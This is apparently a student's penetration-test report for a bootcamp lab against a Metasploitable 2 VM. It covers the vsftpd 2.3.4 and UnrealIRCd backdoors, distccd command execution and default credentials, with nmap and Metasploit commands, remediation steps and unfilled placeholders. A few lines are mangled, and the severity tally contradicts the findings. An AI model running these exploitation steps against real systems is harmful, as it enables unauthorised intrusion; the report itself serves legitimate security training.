**VULNERABILITY ASSESSMENT & PENETRATION TEST REPORT**

  --------------------- -----------------------------------------------
  **Field**             **Detail**

  Target environment    Metasploitable 2 (lab VM), host-only network

  Date of assessment    \[insert date you ran the scan\]

  Prepared by           Wazir Jawad Ahmed--- Digital Forensics & Cyber
                        Security Bootcamp, Atomcamp

  Prepared for          Atomcamp --- Day 3/Assignment submission
                        (s07-report)

  Classification        CONFIDENTIAL --- Lab Use Only

  Engagement type       Grey-box (host IP supplied; no
                        credentials/source given)
  --------------------- -----------------------------------------------

# 1. Executive Summary

This engagement assessed a single lab host (Metasploitable 2) to
identify exploitable vulnerabilities and demonstrate their real-world
impact. Scanning, manual research and controlled exploitation were
performed; four findings are documented below with full proof of
concept.

  ------------------------ --------------------------------------------
  **Metric**               **Value**

  Total vulnerabilities    4 (1 Critical, 2 High, 1 High)
  identified               

  Highest severity rating  Critical (CVSS 9.8)

  Primary impact           Unauthenticated remote code execution as
                           root via an unpatched FTP service, plus
                           multiple services reachable with
                           default/weak credentials

  Engagement type          Grey-box (IP-only scope, internal lab
                           network)

  Simulation type          Reconnaissance, automated scanning,
                           exploitation, limited post-exploitation
  ------------------------ --------------------------------------------

# 2. Engagement Scope and Details

  ------------------- ------------------------------------------------
  **Element**         **Detail**

  Scope type          Grey-box --- target IP supplied, no credentials
                      or source code given

  Targets             Metasploitable 2, single host (e.g. 10.0.2.3 ---
                      replace with your lab IP)

  Testing window      \[insert lab session date/time\]

  Methodology         NIST SP 800-115 style: recon → scanning →
                      exploitation → reporting; OWASP where applicable

  Access granted      None beyond network reachability (host-only
                      adapter)

  Excluded techniques Denial of service, destructive payloads, social
                      engineering, physical access

  Source address      Kali attacker VM on the same host-only segment

  Tools used          nmap, Greenbone/OpenVAS (GVM), Metasploit
                      Framework
  ------------------- ------------------------------------------------

# 3. Findings and Proofs of Concept

Four findings are documented in descending severity order. Findings 1
and 4 follow the instructor\'s worked examples from the Day 3 handout;
Findings 2 and 3 are additional, well-documented Metasploitable 2
vulnerabilities you should reproduce and re-screenshot against your own
scan before submission.

## 3.1 Backdoor Command Execution in vsftpd 2.3.4

  ---------------- ---------------------------------------------------
  **Field**        **Value**

  Severity         CRITICAL (CVSS 9.8)

  CVSS Vector      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

  Affected Asset   21/tcp --- FTP --- vsftpd 2.3.4

  CVE              CVE-2011-2523

  CWE              CWE-78 --- OS Command Injection
  ---------------- ---------------------------------------------------

**Description**

The vsftpd 2.3.4 source archive distributed between 30 June and 3 July
2011 was trojanised to include a backdoor. Sending a username containing
\':)\' to the FTP service causes it to open a root shell on TCP port
6200.

**Proof of Concept**

***Step 1 --- Discovery via nmap***

nmap -sV -p21 10.0.2.3

![](media/image1.png){width="6.5in" height="1.8090277777777777in"}msfWhy
it matters: Version detection identifies the exact vulnerable build.

***Step 2 --- Exploitation via Metasploit***

msfconsole -q\
use exploit/unix/ftp/vsftpd_234_backdoor\
set RHOSTS 10.0.2.3\
exploit

![](media/image2.png){width="6.5in" height="2.4555555555555557in"}Why it
matters: The module triggers the backdoor and connects to port 6200.

***Step 3 --- Confirmation of access***

id

![](media/image3.png){width="6.5in" height="0.71875in"}Why it matters:
Confirms root-level code execution.

**Impact**

Unauthenticated remote code execution as root on a host that also
provides database services. Complete loss of confidentiality, integrity
and availability.

**Remediation**

- Upgrade vsftpd to a current, maintained release.

- Disable anonymous and unnecessary legacy FTP services entirely.

- If FTP is business-critical, restrict port 21 to named source
  addresses.

- Verify package signatures against the vendor before deployment.

**References**

- exploit-db.com/exploits/49757

- nvd.nist.gov/vuln/detail/CVE-2011-2523

- rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/

## 3.2 Backdoor Command Execution in UnrealIRCd 3.2.8.1

  ---------------- ---------------------------------------------------
  **Field**        **Value**

  Severity         CRITICAL (CVSS 9.8)

  CVSS Vector      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

  Affected Asset   6667/tcp --- IRC --- UnrealIRCd 3.2.8.1

  CVE              CVE-2010-2075

  CWE              CWE-78 --- OS Command Injection
  ---------------- ---------------------------------------------------

**Description**

The downloadable UnrealIRCd 3.2.8.1 archive was replaced by an attacker
with a backdoored copy. Any input prefixed with \'AB;\' sent to the IRC
listener is executed as a shell command.

**Proof of Concept**

***Step 1 --- Discovery via nmap***

nmap -sV -p6667 10.0.2.3

![](media/image4.png){width="6.5in" height="1.6472222222222221in"}Why it
matters: Confirms the vulnerable service and version banner.

***Step 2 --- Exploitation via Metasploit***

msfconsole -q\
use exploit/unix/irc/unreal_ircd_3281_backdoor\
set RHOSTS 10.0.2.3\
exploit

![](media/image5.png){width="6.5in" height="1.3833333333333333in"}Why it
matters: The module sends the \'AB;\' trigger string with an embedded
payload.

***Step 3 --- Confirmation of access***

id; hostname

![](media/image6.png){width="4.7194083552056in"
height="0.34379811898512685in"}Why it matters: Verifies code execution
on the correct host.

**Impact**

Unauthenticated remote code execution. Full compromise of the host
running the IRC service.

**Remediation**

- Remove or upgrade UnrealIRCd; download only from the official, signed
  source.

- Verify checksums/signatures of any binary before installation.

- Restrict IRC service exposure to trusted networks only.

**References**

- exploit-db.com/exploits/16922

- nvd.nist.gov/vuln/detail/CVE-2010-2075

## 3.3 Remote Command Execution via distccd

  ---------------- ---------------------------------------------------
  **Field**        **Value**

  Severity         HIGH (CVSS 8.1)

  CVSS Vector      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

  Affected Asset   3632/tcp --- distccd

  CVE              CVE-2004-2687

  CWE              CWE-78 --- OS Command Injection
  ---------------- ---------------------------------------------------

**Description**

distccd, when bound to a network-reachable interface without access
control, executes any compilation job submitted to it --- including
arbitrary shell commands --- as the user running the daemon.

**Proof of Concept**

***Step 1 --- Discovery via nmap***

nmap -sV -p3632 10.0.2.3

***Step 2 --- Exploitation via Metasploit***

msfconsole -q\
use exploit/unix/misc/distcc_exec\
set RHOSTS 10.0.2.3\
exploit

![](media/image7.png){width="6.5in" height="3.0409722222222224in"}
![](media/image8.png){width="6.5in" height="1.3423611111111111in"}

ssh**Impact**

Remote code execution as a low-privilege service account; a useful
foothold for further privilege escalation and lateral movement.

**Remediation**

- Disable distccd on any host that does not need distributed
  compilation.

- If required, bind it to localhost only or restrict with \--allow and a
  firewall.

- Never expose build-tooling daemons to untrusted networks.

**References**

- nvd.nist.gov/vuln/detail/CVE-2004-2687

- rapid7.com/db/modules/exploit/unix/misc/distcc_exec/

## 3.4 Weak / Default Credentials on Multiple Services

  ---------------- ---------------------------------------------------
  **Field**        **Value**

  Severity         HIGH (CVSS 8.1)

  CVSS Vector      CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

  Affected Asset   FTP (21/tcp), SSH (22/tcp), MySQL (3306/tcp), HTTP
                   login (80/tcp)

  CVE              N/A --- configuration weakness, not a CVE

  CWE              CWE-1392 --- Use of Default Credentials
  ---------------- ---------------------------------------------------

**Description**

Two accounts were found using default, publicly documented credentials:
user:user and msfadmin:msfadmin. These are published in the product
documentation and are the first pair any attacker attempts.

**Proof of Concept**

***Step 1 --- FTP login***

ftp 10.0.2.3\
Name: user Password: usersshshh

![](media/image9.png){width="4.1047397200349955in"
height="1.2814293525809275in"}ssh Why it matters: Default credentials
grant interactive access.

***Step 2 --- Credential reuse against SSH***

ssh msfadmin@10.0.2.3

![](media/image10.png){width="6.5in" height="2.125in"}Why it matters:
The same weak credentials are valid on a second service.

**Impact**

Authenticated access to the host, including local privilege escalation
via sudo, without requiring any software vulnerability.

**Remediation**

- Change all default credentials before the system is reachable on any
  network.

- Enforce a minimum password length of 10+ characters with complexity.

- Deploy a banned-password list that includes rockyou.txt entries.

- Disable unused accounts; audit for credential reuse across services.

- Enable MFA on any remotely reachable administrative interface.

**References**

- cwe.mitre.org/data/definitions/1392.html

# 4. Remediation Summary 

  -------------- ------------------ ------------------------------- -------------
  **Priority**   **Finding**        **Action**                      **Owner /
                                                                    Timeframe**

  1              vsftpd backdoor    Patch/remove vsftpd 2.3.4       Immediate
                 (Critical)         immediately; verify source of   
                                    any package before install      

  2              UnrealIRCd         Remove/upgrade UnrealIRCd;      Immediate
                 backdoor           verify binary signatures        
                 (Critical)                                         

  3              distccd RCE (High) Disable distccd or bind to      Current cycle
                                    localhost + firewall            

  4              Default            Rotate all default accounts;    Current cycle
                 credentials (High) enforce password policy + MFA   
  -------------- ------------------ ------------------------------- -------------

# 5. References

- CVE-2011-2523 --- nvd.nist.gov/vuln/detail/CVE-2011-2523

- CVE-2010-2075 --- nvd.nist.gov/vuln/detail/CVE-2010-2075

- CVE-2004-2687 --- nvd.nist.gov/vuln/detail/CVE-2004-2687

- CWE-1392 --- cwe.mitre.org/data/definitions/1392.html

- Rapid7 Metasploit Module Database --- rapid7.com/db

- Exploit-DB --- exploit-db.com

# 6. GVM (Greenbone/OpenVAS) Comparison 

  ------------------- ------------- ------------ ----------------------
  **Manual finding**  **Found by    **GVM        **Agreement /
                      GVM? (Y/N)**  severity**   Discrepancy notes**

  vsftpd 2.3.4        \[fill in\]   \[fill in\]  \[explain any
  backdoor                                       score/wording
                                                 difference\]

  UnrealIRCd backdoor \[fill in\]   \[fill in\]  \[ \]

  distccd RCE         \[fill in\]   \[fill in\]  \[ \]

  Default/weak        \[fill in\]   \[fill in\]  \[GVM often flags this
  credentials                                    differently, e.g. as a
                                                 generic auth finding\]
  ------------------- ------------- ------------ ----------------------

Write 3--5 sentences: where GVM agreed with the manual results, where it
differed (false positives, missed findings, or severity disagreements),
and why --- e.g. GVM may score CVSS under a different version, or flag
additional findings (SSL/TLS weaknesses, SMB signing, etc.) not manually
verified here.

# 7. Exploitation Write-Up

This section documents the Metasploit exploitation step by step
(satisfies the 20% \'Exploitation write-up\' assignment component). It
expands on Finding 3.1 with command-level explanation.

msfconsole -q

Launches the Metasploit console in quiet mode (suppresses the startup
banner).

search vsftpd 2.3.4

Queries the local module database for exploits matching the service and
version identified by nmap.

use exploit/unix/ftp/vsftpd_234_backdoor

Selects the matching exploit module by its full path.

show options

Lists the module\'s required parameters --- here, RHOSTS (target) and
RPORT (21, the FTP port, already set as default).

set RHOSTS 10.0.2.3

Assigns the lab target\'s IP address to the module.

exploit

Runs the module. It connects to port 21, sends the trigger username,
then connects to the backdoor listener on port 6200 to catch the
resulting root shell.

id

.

![](media/image11.png){width="6.5in" height="4.6375in"}
